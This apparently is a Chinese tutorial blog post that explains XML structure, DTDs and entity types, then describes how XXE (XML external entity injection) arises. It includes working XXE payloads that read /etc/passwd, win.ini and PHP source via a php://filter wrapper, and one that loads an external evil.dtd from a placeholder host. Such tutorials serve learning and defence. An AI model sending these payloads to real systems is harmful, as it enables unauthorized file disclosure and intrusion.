---
title: XXE 学习(一) 初识xml 及xxe成因
categories: web漏洞
---
## 什么是XML
[XML通俗理解](https://www.cnblogs.com/nnnlillian/p/8440169.html)

---
### 定义与理解
XML用于标记电子文件使其具有`结构性的标记语`言，可以用来标记数据、定义数据类型，是一种`允许用户对自己的标记语言进行定义的源语言`。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

>XML 被设计用来传输和存储数据。
HTML 被设计用来显示数据

>XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。

>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构

<!--more-->
---
### XML的语法规则
>XML 文档必须有一个根元素
XML 元素都必须有一个关闭标签
XML 标签对大小敏感
XML 元素必须被正确的嵌套
XML 属性值必须加引导



---
### XML 文档
xml文档的`构建模块`:

所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：

> 元素
 属性
 实体
 PCDATA
 CDATA

下面是每个构建模块的简要描述。

1，元素

元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。

例:
```
<body>body text in between</body>
<message>some message in between</message>
空的 HTML 元素的例子是 "hr"、"br" 以及 "img"。
```

2，属性

属性可提供有关元素的额外信息

例：
```
<img src="computer.gif" />
```
3，实体

实体是用来定义普通文本的变量。实体引用是对实体的引用。

4，PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data）。

PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。

5，CDATA

CDATA 的意思是字符数据（character data）

CDATA 是不会被解析器解析的文本。


(*)**XML文档结构包括 `XML声明`、`DTD文档类型定义`（可选）、`文档元素`**

![](https://img-blog.csdnimg.cn/20210314002127602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
例：

```xml
<!--XML声明-->
<?xml version="1.0"?>                    
<!--文档类型定义-->
<!DOCTYPE note [                           /<!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>      <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>                     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>                   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>                   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>                   <!--定义body元素为”#PCDATA”类型-->
]>
<!--文档元素-->                                           
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>

```
### DTD及其声明
DTD（文档类型定义）的作用是定义XML文档的合法构建模块

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

DTD有以下声明方式

1.内部声明

```
 <!DOCTYPE 根元素 [元素声明]>
```
2.引用外部DTD：
```
<!DOCTYPE 根元素 SYSTEM "文件名">
```
3.内外部DTD文档结合：
```
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
```

DTD中的一些重要的关键字：

•	DOCTYPE（DTD的声明）
•	ENTITY（实体的声明）
•	SYSTEM、PUBLIC（外部资源申请）


---
## 实体类别
实体是用于定义引用普通文本或特殊字符的快捷方式的变量 

实体又分为 `一般实体`和`参数实体`

1，一般实体的声明语法:`<!ENTITY 实体名 "实体内容“>`
引用实体的方式：&实体名称；

2，参数实体只能在DTD中声明在DTD中引用

参数实体的声明格式： `<!ENTITY % 实体名 "实体内容“>`
引用实体的方式：%实体名称；


---
## DTD实体声明
### 内部实体声明

```xml
<!ENTITY 实体名称 “实体的值”>
```

例子：
```
<?xml version="1.0">
<!DOCTYPE note [
<!ELEMENT note(name)>
<!ENTITY hacker "ESHLkangi">
]>

<note>
<name>&hacker;</name>
</note>
```

---
### 外部实体声明
`XML中对数据的引用称为实体`，实体中有一类叫外部实体，用来引入外部资源，有`SYSTEM和PUBLIC`两个关键字，表示实体来自本地计算机还是公共计算机，外`部实体的引用可以借助各种协议`，比如如下的三种：

```
file:///path/to/file.ext
http://url
php://filter/read=convert.base64-encode/resource=conf.php
```

外部引用可支持`http，file等协议`，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![](https://img-blog.csdnimg.cn/20210314003705442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
 <!ENTITY 实体名称 SYSTEM “URL/URL”>
```

例子：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```
这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过`&xxe`被存放在了methodname元素中，造成了敏感信息的泄露。

---
### 参数实体声明

```
 <!ENTITY % 实体名称 “实体的值”>
 or
 <!ENTITY % 实体名称 SYSTEM “URI”>
```

例子：

```
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
```
外部evil.dtd中的内容

```
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
```

---
### 引用公共实体

```
<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
```


---
## XXE
### 定义
XXE漏洞全称(XML External Entity Injection) 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害

---
### 易发地
XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件

---
### 原理

有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)

### 实例
code1：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&passwd;</value>
</foo>
```


code2：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE b [<!ENTITY entityex SYSTEM "file:///folder/file">]>
<foo>
        <value>&entityex;</value>
</foo>
```

code3：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
]>
<root>
<name>&xxe;</name>
</root>
```

以Code1代码为例

XML外部实体 ‘passwd’ 被赋予的值为：file:///etc/passwd。

在解析XML文档的过程中，实体’passwd’的值会被替换为URI(file:///etc/passwd)内容值(也就是passwd文件的内容)。

`关键字’SYSTEM’会告诉XML解析器，’passwd’实体的值将从其后的URI中读取`
